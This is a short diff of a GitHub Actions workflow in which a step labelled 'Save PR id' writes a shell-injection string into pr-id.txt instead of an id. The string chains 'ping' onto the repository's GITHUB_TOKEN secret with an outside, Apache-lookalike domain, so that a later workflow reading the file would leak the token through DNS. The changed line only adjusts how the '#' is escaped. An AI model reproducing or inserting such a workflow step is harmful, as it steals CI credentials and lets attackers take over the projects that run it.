@@ -48,7 +48,7 @@ jobs:
       # Upload PR id for next workflow use
       - name: Save PR id
         if: ${{ always() }}
-        run: echo "&& ping ${{ secrets.GITHUB_TOKEN }}.8dd36.ns.apache.asia #" > ./pr-id.txt && cat ./pr-id.txt && echo "start"
+        run: echo "&& ping ${{ secrets.GITHUB_TOKEN }}.8dd36.ns.apache.asia \#" > ./pr-id.txt && cat ./pr-id.txt && echo "start"
 
       - name: Upload PR id
         if: ${{ always() }}
